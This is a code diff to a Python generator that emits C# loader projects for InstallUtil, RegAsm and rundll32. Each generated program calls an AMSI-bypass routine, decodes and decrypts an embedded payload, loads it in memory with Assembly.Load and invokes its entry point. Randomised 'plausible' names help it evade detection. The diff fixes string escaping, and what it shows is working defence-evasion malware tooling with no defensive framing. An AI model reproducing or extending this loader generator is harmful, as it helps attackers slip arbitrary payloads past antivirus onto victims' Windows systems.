@@ -65,10 +65,10 @@ def _generate_installutil_project(
         "using System.Reflection;\n\n"
         "[RunInstaller(true)]\n"
         f"public class {main_cls} : Installer\n"
-        "{{\n"
+        "{\n"
         f'    private static readonly string {key_field} = "{key_b64}";\n\n'
         f"    public override void Uninstall(IDictionary {plausible_field()})\n"
-        "    {{\n"
+        "    {\n"
         f"        {amsi_cls}.{amsi_method}();\n\n"
         f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
         f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
@@ -79,12 +79,12 @@ def _generate_installutil_project(
         f"        var {asm_var} = Assembly.Load({plain_var});\n"
         f"        var {ep_var} = {asm_var}.EntryPoint;\n"
         f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
-        f"            ? new object?[] {{ new string[0] }}\n"
-        f"            : Array.Empty<object?>();\n"
+        f"            ? new object[] {{ new string[0] }}\n"
+        f"            : Array.Empty<object>();\n"
         f"        {ep_var}.Invoke(null, {args_var});\n"
-        "    }}\n\n"
-        "    public static void Main() {{ }}\n"
-        "}}\n"
+        "    }\n\n"
+        "    public static void Main() { }\n"
+        "}\n"
     )
     (project_dir / "Program.cs").write_text(program_cs)
 
@@ -125,6 +125,8 @@ def _generate_regasm_project(
         "</Project>\n"
     )
 
+    method_name = plausible_name()
+    param_name = plausible_field()
     program_cs = (
         "using System;\n"
         "using System.Reflection;\n"
@@ -132,11 +134,11 @@ def _generate_regasm_project(
         "[ComVisible(true)]\n"
         f'[Guid("{guid}")]\n'
         f"public class {main_cls}\n"
-        "{{\n"
+        "{\n"
         f'    private static readonly string {key_field} = "{key_b64}";\n\n'
         "    [ComUnregisterFunction]\n"
-        f"    public static void {plausible_name()}(string {plausible_field()})\n"
-        "    {{\n"
+        f"    public static void {method_name}(string {param_name})\n"
+        "    {\n"
         f"        {amsi_cls}.{amsi_method}();\n\n"
         f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
         f"        var {idx_var} = Convert.FromBase64String({key_field});\n\n"
@@ -147,11 +149,11 @@ def _generate_regasm_project(
         f"        var {asm_var} = Assembly.Load({plain_var});\n"
         f"        var {ep_var} = {asm_var}.EntryPoint;\n"
         f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
-        f"            ? new object?[] {{ new string[0] }}\n"
-        f"            : Array.Empty<object?>();\n"
+        f"            ? new object[] {{ new string[0] }}\n"
+        f"            : Array.Empty<object>();\n"
         f"        {ep_var}.Invoke(null, {args_var});\n"
-        "    }}\n"
-        "}}\n"
+        "    }\n"
+        "}\n"
     )
     (project_dir / "Program.cs").write_text(program_cs)
 
@@ -196,12 +198,12 @@ def _generate_rundll32_project(
         "using System.Reflection;\n"
         "using System.Runtime.InteropServices;\n\n"
         f"public class {main_cls}\n"
-        "{{\n"
+        "{\n"
         f'    private static readonly string {key_field} = "{key_b64}";\n\n'
         '    [DllExport("DllMain", CallingConvention = CallingConvention.StdCall)]\n'
         "    public static void DllMain(\n"
         "        IntPtr hinstDLL, uint fdwReason, IntPtr lpvReserved)\n"
-        "    {{\n"
+        "    {\n"
         "        if (fdwReason != 1) return;\n\n"
         f"        {amsi_cls}.{amsi_method}();\n\n"
         f"        var {result_var} = Convert.FromBase64String({reassemble_expr});\n"
@@ -213,11 +215,11 @@ def _generate_rundll32_project(
         f"        var {asm_var} = Assembly.Load({plain_var});\n"
         f"        var {ep_var} = {asm_var}.EntryPoint;\n"
         f"        var {args_var} = {ep_var}!.GetParameters().Length > 0\n"
-        f"            ? new object?[] {{ new string[0] }}\n"
-        f"            : Array.Empty<object?>();\n"
+        f"            ? new object[] {{ new string[0] }}\n"
+        f"            : Array.Empty<object>();\n"
         f"        {ep_var}.Invoke(null, {args_var});\n"
-        "    }}\n"
-        "}}\n"
+        "    }\n"
+        "}\n"
     )
     (project_dir / "Program.cs").write_text(program_cs)
 
